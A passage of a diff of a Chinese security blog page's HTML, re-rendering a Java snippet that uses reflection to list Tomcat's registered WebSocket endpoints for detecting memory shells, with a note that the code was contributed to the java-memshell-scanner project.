-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">synchronized</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">ServerEndpointConfig</span><span class="o">&gt;</span> <span class="nf">getEndpointConfigs</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-    <span class="n">ServerContainer</span> <span class="n">sc</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServerContainer</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">ServerContainer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
-    <span class="n">Field</span> <span class="n">_configExactMatchMap</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;configExactMatchMap&#34;</span><span class="o">);</span>
-    <span class="n">_configExactMatchMap</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-    <span class="n">ConcurrentHashMap</span> <span class="n">configExactMatchMap</span> <span class="o">=</span> <span class="o">(</span><span class="n">ConcurrentHashMap</span><span class="o">)</span> <span class="n">_configExactMatchMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">sc</span><span class="o">);</span>
-
-    <span class="n">Class</span> <span class="n">_ExactPathMatch</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.tomcat.websocket.server.WsServerContainer$ExactPathMatch&#34;</span><span class="o">);</span>
-    <span class="n">Method</span> <span class="n">_getconfig</span> <span class="o">=</span> <span class="n">_ExactPathMatch</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;getConfig&#34;</span><span class="o">);</span>
-    <span class="n">_getconfig</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-
-    <span class="n">List</span><span class="o">&lt;</span><span class="n">ServerEndpointConfig</span><span class="o">&gt;</span> <span class="n">configs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
-    <span class="n">Iterator</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;&gt;</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">configExactMatchMap</span><span class="o">.</span><span class="na">entrySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
-
-    <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
-        <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
-        <span class="n">ServerEndpointConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServerEndpointConfig</span><span class="o">)</span><span class="n">_getconfig</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
-        <span class="n">configs</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">config</span><span class="o">);</span>
-    <span class="o">}</span>
-    <span class="k">return</span> <span class="n">configs</span><span class="o">;</span>
-<span class="o">}</span>
-
-
-<span class="n">configs</span> <span class="o">=</span> <span class="n">getEndpointConfigs</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
-<span class="k">for</span> <span class="o">(</span><span class="n">ServerEndpointConfig</span> <span class="n">cfg</span> <span class="o">:</span> <span class="n">configs</span><span class="o">)</span> <span class="o">{</span>
-    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getPath</span><span class="o">())</span><span class="err">；</span>
-    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getEndpointClass</span><span class="o">().</span><span class="na">getName</span><span class="o">())</span><span class="err">；</span>
-    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getEndpointClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">())</span><span class="err">；</span>
-    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">classFileIsExists</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getEndpointClass</span><span class="o">()))</span><span class="err">；</span>
-    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getEndpointClass</span><span class="o">().</span><span class="na">getName</span><span class="o">())</span><span class="err">；</span>
-    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getEndpointClass</span><span class="o">().</span><span class="na">getName</span><span class="o">())));</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">synchronized</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">ServerEndpointConfig</span><span class="o">&gt;</span> <span class="nf">getEndpointConfigs</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ServerContainer</span> <span class="n">sc</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServerContainer</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">ServerContainer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Field</span> <span class="n">_configExactMatchMap</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;configExactMatchMap&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_configExactMatchMap</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ConcurrentHashMap</span> <span class="n">configExactMatchMap</span> <span class="o">=</span> <span class="o">(</span><span class="n">ConcurrentHashMap</span><span class="o">)</span> <span class="n">_configExactMatchMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">sc</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Class</span> <span class="n">_ExactPathMatch</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.apache.tomcat.websocket.server.WsServerContainer$ExactPathMatch&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Method</span> <span class="n">_getconfig</span> <span class="o">=</span> <span class="n">_ExactPathMatch</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;getConfig&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_getconfig</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">List</span><span class="o">&lt;</span><span class="n">ServerEndpointConfig</span><span class="o">&gt;</span> <span class="n">configs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Iterator</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;&gt;</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">configExactMatchMap</span><span class="o">.</span><span class="na">entrySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ServerEndpointConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServerEndpointConfig</span><span class="o">)</span><span class="n">_getconfig</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">configs</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">config</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">configs</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">configs</span> <span class="o">=</span> <span class="n">getEndpointConfigs</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="o">(</span><span class="n">ServerEndpointConfig</span> <span class="n">cfg</span> <span class="o">:</span> <span class="n">configs</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getPath</span><span class="o">())</span><span class="err">；</span>
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getEndpointClass</span><span class="o">().</span><span class="na">getName</span><span class="o">())</span><span class="err">；</span>
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getEndpointClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">())</span><span class="err">；</span>
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">classFileIsExists</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getEndpointClass</span><span class="o">()))</span><span class="err">；</span>
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getEndpointClass</span><span class="o">().</span><span class="na">getName</span><span class="o">())</span><span class="err">；</span>
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">cfg</span><span class="o">.</span><span class="na">getEndpointClass</span><span class="o">().</span><span class="na">getName</span><span class="o">())));</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>已PR到：<a href="https://github.com/c0ny1/java-memshell-scanner" target="_blank" rel="noopener">java-memshell-scanner</a></p>
 <p>说句题外话：有一说一，用Tomcat起WebSocket服务不是那么常见，如果发现了有注册的Endpoint的话，蓝队们还需要谨慎对待。</p>
@@ -629,7 +629,7 @@
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2022-10-30 10:47:31 CST" style="cursor:help">
+        <span title="Updated @ 2022-10-30 10:47:32 CST" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2022-10-30</text><text x="915" y="140" textLength="650" transform="scale(.1)">2022-10-30</text></g></svg>
         </span></div>
